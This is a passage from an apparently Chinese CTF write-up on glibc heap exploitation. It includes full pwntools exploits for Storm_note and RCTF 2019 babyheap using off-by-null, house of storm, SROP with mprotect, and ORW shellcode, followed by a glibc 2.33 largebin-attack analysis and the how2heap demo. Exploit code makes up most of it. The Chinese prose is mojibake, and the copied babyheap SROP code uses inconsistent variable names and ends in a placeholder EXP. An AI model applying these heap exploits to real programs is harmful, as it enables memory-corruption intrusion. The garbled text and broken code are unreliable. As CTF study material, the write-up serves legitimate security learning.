<img src="http://static.zybuluo.com/hgggg/o7h2sh44ip7kpyk8qy56eok8/image_1fignpogf1l341uj3ab51slmo059.png" alt="image_1fignpogf1l341uj3ab51slmo059.png-32.8kB"></p>
<p>Step3 ä¿®æ”¹éšæœºæ•°ï¼Œgetshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span>+p64(<span class="number">0</span>) * <span class="number">6</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0</span>)*<span class="number">6</span>)</span><br></pre></td></tr></table></figure>
<h4 id="exp"><a class="header-anchor" href="#exp">Â¶</a>exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;Storm_note&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;Storm_note&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size ?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index ?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content: \n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index ?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">lock</span>):</span></span><br><span class="line">    choice(<span class="number">666</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;in\n&quot;</span>)</span><br><span class="line">    p.sendline(lock)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>)) <span class="comment">#ä¿®æ”¹prve_sizeï¼Œç¡®ä¿å †å—çš„åˆæ³•æ€§</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>) <span class="comment">#off by null</span></span><br><span class="line">add(<span class="number">0x18</span>)    <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>)   <span class="comment">#7 </span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)   </span><br><span class="line">add(<span class="number">0x30</span>)   <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4e0</span>)  <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>) <span class="comment">#off by null</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#8 </span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)       <span class="comment">#overlap</span></span><br><span class="line">add(<span class="number">0x40</span>)     <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)   </span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line">free(<span class="number">2</span>) </span><br><span class="line"></span><br><span class="line">content_addr = <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk = content_addr - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(fake_chunk)      </span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)   </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">8</span>,payload2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span>+p64(<span class="number">0</span>) * <span class="number">6</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0</span>)*<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="RCTF-2019-babyheap"><a class="header-anchor" href="#RCTF-2019-babyheap">Â¶</a>RCTF 2019 babyheap</h3>
<h4 id="é¢˜ç›®è€ƒç‚¹-v2"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v2">Â¶</a>é¢˜ç›®è€ƒç‚¹</h4>
<pre><code>1.chunk overlap
2.largebin attack
3.off by null
4.SROP
5.shellcode ç¼–å†™
</code></pre>
<h4 id="é¢˜ç›®åˆ†æ-v2"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ-v2">Â¶</a>é¢˜ç›®åˆ†æ</h4>
<p>æœ¬é¢˜çš„æ¼æ´ç‚¹å’Œä¸Šä¸€é¢˜ç›¸ä¼¼ï¼Œä½†æ¯”ä¸Šä¸€é¢˜ç¨éš¾ï¼Œæœ¬é¢˜åŒæ ·ç¦ç”¨äº†fastbinï¼ŒåŒæ—¶è¿˜å¼€å¯äº†æ²™ç›’ä¿æŠ¤ç¦ç”¨äº†59å·ç³»ç»Ÿè°ƒç”¨,è¿™æ„å‘³ç€æˆ‘ä»¬æ— æ³•åˆ©ç”¨systemç›´æ¥getshell,æ‰€ä»¥æƒ³åˆ°åˆ©ç”¨orwæ¥è¯»flagã€‚é¢˜ç›®ç»™å‡ºäº†showå‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨off byæ¼æ´æ¥æ³„éœ²libc,åˆ©ç”¨house of stormåŠ«æŒ__free_hookï¼Œåˆ©ç”¨sropä¿®æ”¹__free_hookå¤„çš„æƒé™çš„å†…å­˜æƒé™ï¼Œæœ€åå°†æˆ‘ä»¬çš„shellcodeæ¤å…¥ï¼Œæ¥è¯»å–flag</p>
<p>step1<br>
æ³„éœ²libcåœ°å€</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0x100</span>)) <span class="comment"># set prev_size</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">add(<span class="number">0x160</span>)</span><br></pre></td></tr></table></figure>
<p>è¯´ä¸€ä¸‹éƒ½åšäº†ä»€ä¹ˆï¼šç”³è¯·0ï¼Œ1ï¼Œ2å·å—ï¼Œç”³è¯·3å·å—é˜²æ­¢åˆå¹¶ï¼Œåˆ©ç”¨off by null ä¿®æ”¹chunk2çš„p_sizeç»•è¿‡unlinkæ£€æŸ¥ï¼Œé‡Šæ”¾2å·å—ï¼Œæ­¤æ—¶0ï¼Œ1ï¼Œ2å·å—éƒ½è¿›å…¥unsortedbinï¼Œç”³è¯·å›0å·å—ï¼Œæ­¤æ—¶1å·å—ä¸­å‚¨å­˜çš„å°±æ˜¯main_arena_xxçš„åœ°å€ï¼Œshow chunk1 å°±èƒ½å¾—åˆ°libcåœ°å€äº†ï¼Œæœ€åå†å°†2å·å—ç”³è¯·å›æ¥</p>
<p>Step2: house of Storm</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x4d8</span>) <span class="comment">#11</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x4e0</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x4d8</span>) <span class="comment">#12</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x4e8</span>) <span class="comment">#6</span></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">content_addr = free_hook</span><br><span class="line">fake_chunk =  content_addr - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4f1</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(fake_chunk)</span><br><span class="line">edit(<span class="number">11</span>,payload)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)   </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">12</span>,payload2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br></pre></td></tr></table></figure>
<p>Step3: SROP(ç›®å‰è¿˜ä¸ä¼šï¼Œç­‰å­¦ä¼šäº†æ¥å¡«è¿™ä¸ªå‘)</p>
<p>ä¸‹é¢æ‘˜è‡ªEXå¸ˆå‚…çš„åšå®¢ï¼Œä¸»è¦ç›®çš„æ˜¯æŠŠ__free_hookåœ°å€è®¾ç½®ä¸ºsetcontextå‡½æ•°ï¼Œä»è€Œæ§åˆ¶ç¨‹åºæµæ‰§è¡Œmprotectå‡½æ•°æŠŠ__free_hookæ‰€åœ¨å†…å­˜ä¹Ÿä¿®æ”¹ä¸ºå¯æ‰§è¡Œï¼Œç„¶åè¯»å…¥æˆ‘ä»¬æ–°çš„shellcodeï¼Œåœ¨è·³åˆ°æ–°çš„shellcodeå»æ‰§è¡Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new_execve_env = __free_hook &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">mov rsi, %d</span></span><br><span class="line"><span class="string">mov edx, 0x1000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % new_execve_env</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span>) + p64(__free_hook + <span class="number">0x10</span>) + asm(shellcode1))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‡å®šæœºå™¨çš„è¿è¡Œæ¨¡å¼</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># è®¾ç½®å¯„å­˜å™¨</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = __free_hook_addr + <span class="number">8</span></span><br><span class="line">frame.rip = libc_addr + libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>] <span class="comment"># 0xa8 rcx</span></span><br><span class="line">frame.rdi = new_execve_env</span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">4</span> | <span class="number">2</span> | <span class="number">1</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">12</span>, <span class="built_in">str</span>(frame))</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;12&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x67616c662f2e ;// ./flag</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rsp ;// ./flag</span></span><br><span class="line"><span class="string">mov rsi, 0 ;// O_RDONLY</span></span><br><span class="line"><span class="string">xor rdx, rdx ;// ç½®0å°±è¡Œ</span></span><br><span class="line"><span class="string">mov rax, 2 ;// SYS_open</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rax ;// fd </span></span><br><span class="line"><span class="string">mov rsi,rsp  ;// è¯»åˆ°æ ˆä¸Š</span></span><br><span class="line"><span class="string">mov rdx, 1024 ;// nbytes</span></span><br><span class="line"><span class="string">mov rax,0 ;// SYS_read</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1 ;// fd </span></span><br><span class="line"><span class="string">mov rsi, rsp ;// buf</span></span><br><span class="line"><span class="string">mov rdx, rax ;// count </span></span><br><span class="line"><span class="string">mov rax, 1 ;// SYS_write</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 0 ;// error_code</span></span><br><span class="line"><span class="string">mov rax, 60</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(asm(shellcode2))</span><br></pre></td></tr></table></figure>
<p>####EXP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å’•å’•å’•</span></span><br></pre></td></tr></table></figure>
<h2 id="glibc-2-33-malloc-céƒ¨åˆ†æºç åˆ†æ"><a class="header-anchor" href="#glibc-2-33-malloc-céƒ¨åˆ†æºç åˆ†æ">Â¶</a>glibc 2.33 malloc.céƒ¨åˆ†æºç åˆ†æ</h2>
<p>ç›¸è¾ƒäºglibc2.23ï¼Œglibc2.33çš„malloc.cä¸­é’ˆå¯¹ï¼Œlargebin æ–°å¢äº†ä¸¤ä¸ªæ£€æŸ¥(è¿™ä¸ªæ£€æŸ¥åœ¨glibc2.30æ—¶è¢«åŠ å…¥)</p>
<p>éƒ¨åˆ†æºç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">    &#123;</span><br><span class="line">      victim_index = smallbin_index (size);</span><br><span class="line">      bck = bin_at (av, victim_index);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      victim_index = largebin_index (size);</span><br><span class="line">      bck = bin_at (av, victim_index);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">      <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">  &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = bck;</span><br><span class="line">              bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">              victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              assert (chunk_main_arena (fwd));</span><br><span class="line">              <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                &#123;</span><br><span class="line">                  fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">assert (chunk_main_arena (fwd));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">== (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                    malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">                  fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                &#125;</span><br><span class="line">              bck = fwd-&gt;bk;</span><br><span class="line">              <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  mark_bin (av, victim_index);</span><br><span class="line">  victim-&gt;bk = bck;</span><br><span class="line">  victim-&gt;fd = fwd;</span><br><span class="line">  fwd-&gt;bk = victim;</span><br><span class="line">  bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
<p>æ–°å¢æ£€æŸ¥å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>è¿™ç›´æ¥å¯¼è‡´ä¹‹å‰çš„large bin attack æ— æ³•ä½¿ç”¨ï¼Œ</p>
<p>åœ¨ç›®å‰çš„2.3+ç‰ˆæœ¬çš„largebin attack ä¸»è¦åˆ©ç”¨çš„æ˜¯ä»¥ä¸‹åˆ†æ”¯ï¼Œè¯¥åˆ†æ”¯å¯ä»¥å‘ä»»æ„åœ°å€å†™å…¥ä¸€ä¸ªå †åœ°å€</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨åŸç†å¦‚ä¸‹:</p>
<p>å½“æˆ‘ä»¬å³å°†è¦è¿›å…¥largebinçš„chunkçš„å¤§å°å°äºlargebinä¸­æœ€å°çš„ä¸€ä¸ªchunkæ—¶ä¼šè¿›å…¥ä¸Šè¿°åˆ¤æ–­</p>
<p>å…¶ä¸­fwdä¸ºlarge bin çš„é“¾è¡¨å¤´,bckæ˜¯largebinä¸­æœ€å°çš„é‚£ä¸ªchunk,victimæ˜¯æˆ‘ä»¬å½“å‰æ’å…¥çš„å †å—</p>
<p>å› ä¸ºæœ‰victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;æ‰€ä»¥æœ‰fwd-&gt;fd-&gt;bk_nextsize-&gt;fd_nextsize = victim;fwd-&gt;fdåˆšå¥½æ˜¯æˆ‘ä»¬largebinä¸­çš„ç¬¬ä¸€å—,å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶å¹¶ä¿®æ”¹å…¶bk_nextsizeä¸ºæˆ‘ä»¬çš„fakechunk-0x20,åˆ™ä¼šæœ‰(fakechunk-0x20)-&gt;fd_nextsize = victim å³fakechunk = victim,è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶fakechunké™„è¿‘çš„åœ°å€ç©ºé—´äº†</p>
<h2 id="how2heap-largebin-attack-for-2-33"><a class="header-anchor" href="#how2heap-largebin-attack-for-2-33">Â¶</a>how2heap largebin attack for 2.33</h2>
<p>ä»£ç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;p2 address (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="keyword">size_t</span>*)target);</span><br><span class="line">  assert((<span class="keyword">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åˆ†æ</p>
<p>Step1: å®šä¹‰ä¸€ä¸ªtargetå¹¶èµ‹å€¼ä¸º0</p>
<p>Step2: ç”³è¯·p1=0x428 p2=0x418ï¼Œg1,g2ç”¨äºé˜²æ­¢å †å—åˆå¹¶</p>
<p>Step3: é‡Šæ”¾p1è¿›å…¥unsorted bin,ç”³è¯·g3=0x438å‘ç”Ÿunsorted binéå†ï¼Œç”±äºp1&lt;0x438ï¼Œp1å°†ä¼šç›´æ¥è¿›å…¥largebin</p>
<p>Step4: é‡Šæ”¾p2è¿›å…¥unsorted bin</p>
<p>Step5: ä¿®æ”¹p1<a href="http://static.zybuluo.com/hgggg/nuka4g6wb1f0exchdwyek2r9/3.png">3</a>å³p1çš„bk_nextsize ä¸ºtarget-0x20</p>
<p>Step6: ç”³è¯·g4=0x438,å‘ç”Ÿunsorted binéå†ï¼Œä¼šå°†p2é“¾å…¥è¿›large binï¼Œç”±äºp2å°äºp1ï¼Œæ‰€ä»¥ä¼šè¿›å…¥å¦‚ä¸‹åˆ†æ”¯</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>
